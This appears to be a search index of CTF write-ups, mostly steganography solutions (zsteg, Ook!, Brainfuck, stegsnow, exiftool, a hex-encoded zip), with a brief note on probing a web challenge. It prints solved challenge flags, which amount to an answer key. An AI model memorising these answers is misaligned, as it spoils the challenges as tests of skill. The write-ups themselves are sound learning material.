\u5982\u6cd5\u70ae\u5236\u5f97\u5230\u4e0d\u540c\u901a\u9053\u7684\u4fe1\u606f \u6362\u4e00\u79cd\u65b9\u5f0f \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ zsteg -h Usage: zsteg [options] filename.png [param_string] -c, --channels X channels (R/G/B/A) or any combination, comma separated valid values: r,g,b,a,rg,rgb,bgr,rgba,... -l, --limit N limit bytes checked, 0 = no limit (default: 256) -b, --bits N number of bits (1..8), single value or '1,3,5' or '1-8' --lsb least significant BIT comes first --msb most significant BIT comes first -P, --prime analyze/extract only prime bytes/pixels -a, --all try all known methods -o, --order X pixel iteration order (default: 'auto') valid values: ALL,xy,yx,XY,YX,xY,Xy,bY,... -E, --extract NAME extract specified payload, NAME is like '1b,rgb,lsb' -v, --verbose Run verbosely (can be used multiple times) -q, --quiet Silent any warnings (can be used multiple times) -C, --[no-]color Force (or disable) color output (default: auto) PARAMS SHORTCUT zsteg fname.png 2b,b,lsb,xy ==> --bits 2 --channel b --lsb --order xy \u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a 1 2 3 $ zsteg warmup.bmp --bits 1 --channel r --lsb --order xy --limit 2048 $ zsteg warmup.bmp --bits 1 --channel g --lsb --order xy --limit 2048 $ zsteg warmup.bmp --bits 1 --channel b --lsb --order xy --limit 2048 --bits 1 \uff1a\u6bcf\u6b21\u53ea\u6458\u53d6\u989c\u8272\u901a\u9053\u4e2d\u7684\u7b2c 1 \u4e2a\u6bd4\u7279\u3002 --channel r \uff1a\u53ea\u6458\u53d6\u7ea2\u8272\u901a\u9053\u7684\u6bd4\u7279\u4f4d\u3002 --lsb \uff1a\u6309\u6700\u4f4e\u6709\u6548\u4f4d\u4f18\u5148\u7684\u987a\u5e8f\u8fdb\u884c\u6458\u53d6\u3002 --order xy \uff1a\u6309\u7167\u4ece\u5de6\u81f3\u53f3\u3001\u4ece\u4e0a\u81f3\u4e0b\u7684\u987a\u5e8f\u5bf9\u56fe\u50cf\u7d20\u70b9\u8fdb\u884c\u6458\u53d6\u3002 --limit 2048 \uff1a\u6700\u591a\u6458\u53d6\u8f93\u51fa 2048 \u5b57\u8282\u3002 zsteg warmup.bmp --all \u53ef\u4ee5\u81ea\u52a8\u5c1d\u8bd5\u6240\u6709\u7684\u65b9\u5f0f Short Ook! \u00b6 \u7531 red.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 ..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!... ..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?. ..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!!! !!!!! !!!.! !!!!. ?.... ..... ....! ?!!.? !!!!! !!!!! !!?.? !.?!! !!!!! !!!!! !!!!! .!!!! !.!!! !!!!! !.... ..... !.!!! ..... ..!.! !!!!! !!!!! !!!!! !!!.? . \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Short Ook! \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 ! \u53f9\u53f7 33\uff08\\x21\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 ? \u95ee\u53f7 63\uff08\\x3F\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 flag{db640436- \uff1a Ook! \u00b6 \u7531 green.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Ook! \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 ! \u53f9\u53f7 33\uff08\\x21\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 ? \u95ee\u53f7 63\uff08\\x3F\uff09 O \u5927\u5199\u5b57\u6bcd O 79\uff08\\x4F\uff09 k \u5c0f\u5199\u5b57\u6bcd k 107\uff08\\x6B\uff09 o \u5c0f\u5199\u5b57\u6bcd o 111\uff08\\x6F\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 7839-4050-8339 \uff1a Brainfuck \u00b6 \u7531 blue.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 +++++ +[->+ +++++ <]>++ +++++ ++.<+ ++[-> +++<] >+.-- .<+++ +++[- >++++ ++<]> +++++ +++.< +++++ +[->- ----- <]>-- --.-- .---- -.<++ +++++ [->++ +++++ <]>++ +.--- .<+++ +++[- >---- --<]> ----- ----- ..--. <++++ ++[-> +++++ +<]>+ +++++ +++++ +.<++ +++[- >++++ +<]>+ .< \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Brainfuck \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 + \u52a0\u53f7 43\uff08\\x2B\uff09 - \u51cf\u53f7 45\uff08\\x2D\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 < \u5c0f\u4e8e\u53f7 60\uff08\\x3C\uff09 > \u5927\u4e8e\u53f7 62\uff08\\x3E\uff09 [ \u5de6\u65b9\u62ec\u53f7 91\uff08\\x5B\uff09 ] \u53f3\u65b9\u62ec\u53f7 93\uff08\\x5D\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 -75a972fc553c} \uff1a loli \u00b6 \u8fd9\u91cc\u6709\u4e2a\u63d0\u793a 255\uff0c\u4e5f\u5c31\u662f 0xFF\u3002 \u63a5\u7740\u7528 010 editor \u6253\u5f00\u56fe\u7247\u53d1\u73b0\u6587\u4ef6\u672b\u5c3e\u591a\u4e86\u4e00\u5757\u3002 \u53c2\u8003 \u00b6 \u89e3\u7801\u7f51\u7ad9 \u5dc5\u5cf0\u6781\u5ba2 \u5dc5\u5cf0\u6781\u5ba22","title":"\u5dc5\u5cf0\u6781\u5ba2"},{"location":"writeup/dianfengjike2018/#_1","text":"","title":"\u5dc5\u5cf0\u6781\u5ba2"},{"location":"writeup/dianfengjike2018/#warmup","text":"","title":"warmup"},{"location":"writeup/dianfengjike2018/#lsb","text":"\u8fd9\u90e8\u5206\u77e5\u8bc6\u5c31\u4e0d\u7ec6\u8bf4\u4e86","title":"LSB\u9690\u5199"},{"location":"writeup/dianfengjike2018/#_2","text":"\u6d4f\u89c8\u4e0d\u540c\u7684\u901a\u9053 Red plane 0 Green plane 0 Blue plane 0","title":"\u5b9a\u4f4d\u9690\u5199\u70b9"},{"location":"writeup/dianfengjike2018/#_3","text":"\u5982\u6cd5\u70ae\u5236\u5f97\u5230\u4e0d\u540c\u901a\u9053\u7684\u4fe1\u606f","title":"\u6458\u53d6\u9690\u5199\u4fe1\u606f"},{"location":"writeup/dianfengjike2018/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ zsteg -h Usage: zsteg [options] filename.png [param_string] -c, --channels X channels (R/G/B/A) or any combination, comma separated valid values: r,g,b,a,rg,rgb,bgr,rgba,... -l, --limit N limit bytes checked, 0 = no limit (default: 256) -b, --bits N number of bits (1..8), single value or '1,3,5' or '1-8' --lsb least significant BIT comes first --msb most significant BIT comes first -P, --prime analyze/extract only prime bytes/pixels -a, --all try all known methods -o, --order X pixel iteration order (default: 'auto') valid values: ALL,xy,yx,XY,YX,xY,Xy,bY,... -E, --extract NAME extract specified payload, NAME is like '1b,rgb,lsb' -v, --verbose Run verbosely (can be used multiple times) -q, --quiet Silent any warnings (can be used multiple times) -C, --[no-]color Force (or disable) color output (default: auto) PARAMS SHORTCUT zsteg fname.png 2b,b,lsb,xy ==> --bits 2 --channel b --lsb --order xy \u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a 1 2 3 $ zsteg warmup.bmp --bits 1 --channel r --lsb --order xy --limit 2048 $ zsteg warmup.bmp --bits 1 --channel g --lsb --order xy --limit 2048 $ zsteg warmup.bmp --bits 1 --channel b --lsb --order xy --limit 2048 --bits 1 \uff1a\u6bcf\u6b21\u53ea\u6458\u53d6\u989c\u8272\u901a\u9053\u4e2d\u7684\u7b2c 1 \u4e2a\u6bd4\u7279\u3002 --channel r \uff1a\u53ea\u6458\u53d6\u7ea2\u8272\u901a\u9053\u7684\u6bd4\u7279\u4f4d\u3002 --lsb \uff1a\u6309\u6700\u4f4e\u6709\u6548\u4f4d\u4f18\u5148\u7684\u987a\u5e8f\u8fdb\u884c\u6458\u53d6\u3002 --order xy \uff1a\u6309\u7167\u4ece\u5de6\u81f3\u53f3\u3001\u4ece\u4e0a\u81f3\u4e0b\u7684\u987a\u5e8f\u5bf9\u56fe\u50cf\u7d20\u70b9\u8fdb\u884c\u6458\u53d6\u3002 --limit 2048 \uff1a\u6700\u591a\u6458\u53d6\u8f93\u51fa 2048 \u5b57\u8282\u3002 zsteg warmup.bmp --all \u53ef\u4ee5\u81ea\u52a8\u5c1d\u8bd5\u6240\u6709\u7684\u65b9\u5f0f","title":"\u6362\u4e00\u79cd\u65b9\u5f0f"},{"location":"writeup/dianfengjike2018/#short-ook","text":"\u7531 red.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 ..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!... ..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?. ..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!!! !!!!! !!!.! !!!!. ?.... ..... ....! ?!!.? !!!!! !!!!! !!?.? !.?!! !!!!! !!!!! !!!!! .!!!! !.!!! !!!!! !.... ..... !.!!! ..... ..!.! !!!!! !!!!! !!!!! !!!.? . \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Short Ook! \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 ! \u53f9\u53f7 33\uff08\\x21\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 ? \u95ee\u53f7 63\uff08\\x3F\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 flag{db640436- \uff1a","title":"Short Ook!"},{"location":"writeup/dianfengjike2018/#ook","text":"\u7531 green.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Ook! \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 ! \u53f9\u53f7 33\uff08\\x21\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 ? \u95ee\u53f7 63\uff08\\x3F\uff09 O \u5927\u5199\u5b57\u6bcd O 79\uff08\\x4F\uff09 k \u5c0f\u5199\u5b57\u6bcd k 107\uff08\\x6B\uff09 o \u5c0f\u5199\u5b57\u6bcd o 111\uff08\\x6F\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 7839-4050-8339 \uff1a","title":"Ook!"},{"location":"writeup/dianfengjike2018/#brainfuck","text":"\u7531 blue.bin \u5f97\u5230\u7684\u9690\u5199\u4fe1\u606f\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 4 +++++ +[->+ +++++ <]>++ +++++ ++.<+ ++[-> +++<] >+.-- .<+++ +++[- >++++ ++<]> +++++ +++.< +++++ +[->- ----- <]>-- --.-- .---- -.<++ +++++ [->++ +++++ <]>++ +.--- .<+++ +++[- >---- --<]> ----- ----- ..--. <++++ ++[-> +++++ +<]>+ +++++ +++++ +.<++ +++[- >++++ +<]>+ .< \u4ee5\u4e0a\u7f16\u7801\u65b9\u5f0f\u79f0\u4e3a Brainfuck \uff0c\u5176\u5305\u542b\u7684\u5b57\u7b26\u96c6\u5982\u4e0b\u6240\u793a\uff1a \u5b57\u7b26 \u542b\u4e49 ASCII \u7801 + \u52a0\u53f7 43\uff08\\x2B\uff09 - \u51cf\u53f7 45\uff08\\x2D\uff09 . \u53e5\u53f7 46\uff08\\x2E\uff09 < \u5c0f\u4e8e\u53f7 60\uff08\\x3C\uff09 > \u5927\u4e8e\u53f7 62\uff08\\x3E\uff09 [ \u5de6\u65b9\u62ec\u53f7 91\uff08\\x5B\uff09 ] \u53f3\u65b9\u62ec\u53f7 93\uff08\\x5D\uff09 \u5c06\u4e0a\u8ff0\u9690\u5199\u4fe1\u606f\u7528\u5de5\u5177\u89e3\u7801\u540e\u5f97\u5230\u5b57\u7b26\u4e32 -75a972fc553c} \uff1a","title":"Brainfuck"},{"location":"writeup/dianfengjike2018/#loli","text":"\u8fd9\u91cc\u6709\u4e2a\u63d0\u793a 255\uff0c\u4e5f\u5c31\u662f 0xFF\u3002 \u63a5\u7740\u7528 010 editor \u6253\u5f00\u56fe\u7247\u53d1\u73b0\u6587\u4ef6\u672b\u5c3e\u591a\u4e86\u4e00\u5757\u3002","title":"loli"},{"location":"writeup/dianfengjike2018/#_5","text":"\u89e3\u7801\u7f51\u7ad9 \u5dc5\u5cf0\u6781\u5ba2 \u5dc5\u5cf0\u6781\u5ba22","title":"\u53c2\u8003"},{"location":"writeup/fivespace/","text":"\u7b2c\u4e94\u7a7a\u95f4 \u00b6 \u7a7a\u76f8 \u00b6 \u968f\u624b\u8f93\u5165\u4e00\u4e2aid=1\u63d0\u793a\u4e0d\u884c \u52a0\u4e00\u4e2a\u7b26\u53f7\u5f97\u5230\u8fd9\u4e9b \u6ca1\u6709token \u626b\u76ee\u5f55\u53d1\u73b0\u4e86\u767b\u9646\u754c\u9762 \u6709\u4e2alogin\u7684\u8def\u7531\u4f46\u662f\u88ab\u91cd\u5b9a\u5411\u5230\u4e86index.php \u65e2\u7136\u90fd\u544a\u8bc9\u4e86\u4f60username\u548cpassword\u603b\u5f97\u6709\u4e2a\u767b\u9646\u754c\u9762\u5427 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u8def\u7531\uff1a \u5c45\u7136\u662fapache\u7684\u521a\u5b89\u88c5\u7684\u65f6\u5019\u7684\u4e00\u4e2a\u7f51\u9875 \u5c1d\u8bd5\u76ee\u5f55\u904d\u5386\u6ca1\u6709\u6210\u529f \u516b\u82e6 \u00b6 \u626b\u76ee\u5f55\u4e5f\u6ca1\u53d1\u73b0\u4ec0\u4e48","title":"\u7b2c\u4e94\u7a7a\u95f4"},{"location":"writeup/fivespace/#_1","text":"","title":"\u7b2c\u4e94\u7a7a\u95f4"},{"location":"writeup/fivespace/#_2","text":"\u968f\u624b\u8f93\u5165\u4e00\u4e2aid=1\u63d0\u793a\u4e0d\u884c \u52a0\u4e00\u4e2a\u7b26\u53f7\u5f97\u5230\u8fd9\u4e9b \u6ca1\u6709token \u626b\u76ee\u5f55\u53d1\u73b0\u4e86\u767b\u9646\u754c\u9762 \u6709\u4e2alogin\u7684\u8def\u7531\u4f46\u662f\u88ab\u91cd\u5b9a\u5411\u5230\u4e86index.php \u65e2\u7136\u90fd\u544a\u8bc9\u4e86\u4f60username\u548cpassword\u603b\u5f97\u6709\u4e2a\u767b\u9646\u754c\u9762\u5427 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u8def\u7531\uff1a \u5c45\u7136\u662fapache\u7684\u521a\u5b89\u88c5\u7684\u65f6\u5019\u7684\u4e00\u4e2a\u7f51\u9875 \u5c1d\u8bd5\u76ee\u5f55\u904d\u5386\u6ca1\u6709\u6210\u529f","title":"\u7a7a\u76f8"},{"location":"writeup/fivespace/#_3","text":"\u626b\u76ee\u5f55\u4e5f\u6ca1\u53d1\u73b0\u4ec0\u4e48","title":"\u516b\u82e6"},{"location":"writeup/hackcon2019/","text":"hackcon2019 \u00b6 Small icon mush wow \u00b6 \u56fe\u7247: Given a file stego.jpg. Just like the title said, I try to extract the thumbnail picture and I got a QR Code. I try to decode it and I got the Flag. The command that I used to extract: exiftool -b -ThumbnailImage stego.jpg > my_thumbnail.jpg \u7136\u540e\u6211\u5c31\u53d1\u73b0\u4e86\u53e6\u4e00\u79cd\u89e3\u6cd5 binwalk \u662f\u53ef\u4ee5\u770b\u5230\u6709\u51e0\u4e2a\u56fe\u7247\u7684\uff0c\u4f46\u662f\u5374\u63d0\u53d6\u4e0d\u51fa\u6765\uff0c foremost \u8bd5\u4e86\u4e00\u4e0b\u4e5f\u884c\u4e0d\u901a\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u76f4\u63a5\u7528 dd \u5427 Too cold for steg \u00b6 Given a file final.txt . When I try to open it, the content is a Sherlock Holmes Novel. Based on the title Too Cold, I guess that this challenge will be related to stegsnow tools. In order to extract the hidden data, I need to find the password. I try to look it on the file and the password was store on there. The command to extract it: stegsnow -C -p \u201cd4rkc0de-IIITD\u201d final.txt \u540e\u6765\u624d\u5f97\u77e5\u8fd9\u662f\u4e00\u79cd\u6587\u672c\u9690\u5199\uff0c\u5c06\u4fe1\u606f\u9690\u85cf\u5728\u6587\u672c\u4e2d stegsnow -m \u6307\u5b9a\u8981\u9690\u85cf\u7684\u4fe1\u606f\uff0c source.txt \u662f\u539f\u6765\u7684\u6587\u4ef6\uff0c readme.txt \u662f\u9690\u85cf\u4e86\u4fe1\u606f\u7684\u6587\u4ef6 1 stegsnow -C -m 'We attack at dawn with Legos!' source.txt readme.txt \u63d0\u53d6\u4fe1\u606f 1 stegsnow -C readme.txt \u5c06\u6587\u4ef6\u9690\u85cf\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d 1 stegsnow -C -f hidden_message.txt source.txt readme.txt \u63d0\u53d6\u6587\u4ef6 1 stegsnow -C readme.txt \u52a0\u5165\u5bc6\u7801\u4fdd\u62a4 1 stegsnow -C -p \"hello12345\" -f hidden_message.txt source.txt readme.txt \u89e3\u5bc6 1 stegsnow -C -p 'hello12345' readme.txt GIMP IT \u00b6 \u5c1d\u8bd5\u901a\u8fc7\u5199\u811a\u672c\u8f6c\u5316 1 2 3 4 5 6 7 8 9 10 11 f = open ( 'xcf.zip' , 'wb' ) a = \"504b 0304 1403 0000 0800 d005 d14e 2057 \\n 40de 7505 0000 c416 0200 0800 0000 6461 \\n 7461 2e74 7874 ecdd d16e 1331 1445 d15f \\n bafe ff9f 03aa 628a 844c 508e 0fa9 baf6 \\n a3a7 93eb acf4 6592 a633 9224 4992 2449 \\n 9224 4992 2449 9224 4992 2449 9224 497a \\n 8956 a4f9 4399 9f7b f4e8 ec32 3b3d 767e \\n 64e2 c489 0722 4e7c 1127 7e7d 5ae6 e788 \\n 1327 4e9c f8b9 c319 b173 57b8 09d7 30e8 \\n 4e5b e126 5cc3 a03b 6d85 9b70 0d83 eeb4 \\n 156e c235 0cba d356 b809 d730 e84e 5be1 \\n 265c c3a0 3b6d 859b 700d 83ee b415 6ec2 \\n 350c bad3 56b8 09d7 30e8 4e5b e126 5cc3 \\n 2073 9dfc e8b9 ffbe 8367 f672 ae61 409c \\n 38f1 e434 e2c4 8913 cf4e 234e 9c38 f1ec \\n 34e2 af2f 7e7e bc7b afdb 3d03 e2c4 8927 \\n a711 1fe2 c489 47a7 111f e2c4 8947 a711 \\n 9f97 127f f4f5 c81c 7595 4ffc c634 e243 \\n 9c38 f1e8 34e2 439c 38f1 e834 e243 fc13 \\n 887f 2872 559e f974 3833 a361 903e 8338 \\n 71e2 cf4b 1227 9e3b 373d 2d23 499c 78ee \\n dcf4 b48c 2471 e2b9 73d3 d332 925f 43fc \\n 5c46 e3d5 d7fe 52e4 7bbd 2b52 fa99 ffaf \\n b553 c46f ac9d 227e 63ed 14f1 1b6b a788 \\n df58 3b45 fcc6 da29 e237 d64e 11bf b176 \\n 8af8 8db5 5329 f174 99bf 70ce 7cb2 3c5f \\n 22e2 ed88 b723 de8e 783b e2ed 88b7 23de \\n 8e78 3be2 29a1 7b57 b86b 97fe 74f8 dedd \\n 69e6 5866 a78d 1d10 df95 7640 7c57 da01 \\n f15d 6907 c477 a51d 10df 9576 407c 57da \\n 01f1 5d69 07c4 77a5 1d10 4f4d 5bbb cc7f \\n 59ca ecb4 3183 787b 06f1 f60c e2ed 19c4 \\n db33 88b7 6710 6fcf 20de 9e41 bc3d 8378 \\n 7bc6 f702 df05 cdcc 4d7f 769c f1cb fc1e \\n 7c8c f8fb 21e2 4f1f 253e c4df 22fe 7e88 \\n f8d3 4789 0ff1 b788 bf1f 22fe f451 e243 \\n fcb7 32f7 1e4d bf57 9079 3720 7d8f 9bc6 \\n 553e 71e2 c489 1327 4e7c 8638 71e2 c433 \\n cfe3 67c4 5f4d 3c73 b59d b99e 9e49 bccf \\n 9079 af20 734f 9a5f 1127 fe23 e2c4 8913 \\n ffc6 debd 6437 0a04 0110 bc52 73ff cb8d \\n b540 c67e 33e3 05d9 e55f e4da aa46 216f \\n 10d0 22de d4bc 23e2 d788 137f 449c 7827 \\n beef 974e 9b67 73f7 e95e 4ace fcd7 33e2 \\n c43f 8838 71e2 c489 1327 4e9c f833 e2c7 \\n af11 af77 4a6a deef bed5 ea79 67c4 a7e6 \\n 9d11 9f9a 7746 7c6a de19 f1a9 7967 c4a7 \\n e69d 119f 9a77 467c 6ade 19f1 a979 67c4 \\n a7e6 bd29 7d6e 76dd a8b9 4fba f976 61df \\n 7f62 2359 af46 9c38 71e2 ed6a c489 1327 \\n deae 469c 38f1 9f2f 5e3f 19bb ef48 1bc9 \\n b576 ddc7 4d9c f83f 234e 9cf8 ed35 9abf \\n 234e 9c38 71e2 7f8d 38f1 21f1 d9fb 86f7 \\n 9dc7 3777 60d7 67fe c489 1327 4e9c 3871 \\n e2f7 5fd1 5835 5388 1327 4ebc 38eb 6df6 \\n 653a 929a 4fa6 d678 469c f8ed 883f 22fe \\n 8c38 f1db 117f 44fc 1971 e2b7 23fe 88f8 \\n b5e2 7aed ecf7 07cd be51 cd95 e523 d120 \\n 4e7c 11bf bd06 71e2 c489 1327 4e9c 38f1 \\n ef27 3e71 85b7 596d ad62 0fa6 faee e8ff \\n 479c 3871 e2c4 8913 ef22 4e9c 38f1 36e2 \\n 33e2 fbce 899b 2bd0 cd31 37bf 6fda ec23 \\n 4c9c f822 4e9c 3871 e2c4 893f 227e fbbd \\n 1127 fefd c56b e746 68df f702 fb9c ebd7 \\n 12bf d6ac 4b9c 3871 e267 cdba c489 1327 \\n 7ed6 ac4b 9cf8 4f17 afef 667e df8e 7da3 \\n 9adf c2a9 af36 1327 4e9c 3871 e2c4 df57 \\n 4812 274e 9cf8 6b85 24f1 9de2 fb7e 93a6 \\n 596d 6272 a34b 9cf8 224e 9c38 71e2 1f45 \\n 9cf8 edd5 2626 1327 4efc ab34 714d b871 \\n 5e2f ddbf cbfb f33f 19e2 d311 9f8e f874 \\n c4a7 233e 1df1 e988 4f47 7c3a e22f 7dfa \\n f5df d79a 3d79 ebb3 f7e6 337a 463c 9bb7 \\n 928e 24e2 9788 67f3 56d2 9144 fc12 f16c \\n de4a 3a92 885f 229e cd5b 4947 12f1 4bc4 \\n b379 2ba9 7e16 b479 aab6 b973 b9d9 a1a9 \\n b627 4e9c 3871 e2c4 89bf 8d38 71e2 c489 \\n ff36 f17d 67c7 cd0e 48fb 9eaf 7d54 3ecd \\n 4b9c 7877 ccc4 8913 27de 1e33 71e2 c489 \\n b7c7 4c9c f89f f6ed 1887 4118 88a2 e095 \\n 9cfb 5f2e 0d12 4189 94c2 cf80 c4fc 1ab3 \\n ec6c 055a ee21 ded4 6da6 507f 0318 5b88 \\n 139f af4b 9c38 71e2 6d5d e2c4 8913 6feb \\n 1227 7e37 f146 add9 93ae dfcf 7f84 38f1 \\n e98e 8813 3f84 38f1 e98e 8813 3f84 38f1 \\n e98e 8813 ffc8 d2bb 34cf 5c4f b599 dbeb \\n d46d e62d 0bce 1227 4e9c 787b 9638 71e2 \\n c4db b3c4 8913 7f92 f8bf 5cf3 87ea bacd \\n e5e6 baf1 15e2 c489 1721 be87 3871 e245 \\n 88ef 214e 9c78 11e2 63bc 0150 4b01 023f \\n 0314 0300 0008 00d0 05d1 4e20 5740 de75 \\n 0500 00c4 1602 0008 0000 0000 0000 0000 \\n 0020 80b4 8100 0000 0064 6174 612e 7478 \\n 7450 4b05 0600 0000 0001 0001 0036 0000 \\n 009b 0500 0000 00\" b = a . split ( ' \\n ' ) for i in range ( len ( b )): n = b [ i ] . encode ( 'utf-8' ) f . write ( n ) f . close () \u4f46\u662f\u8fd9\u6bb5\u811a\u672c\u6ca1\u6709\u6210\u529f\u3002\u3002 When I see the first line of that hex text that I found, I realize that it is a zip file (based on the header). I copy that hex and save it as a zip file . I unzip it and I got a file called data.txt which contains binary file. When I convert it 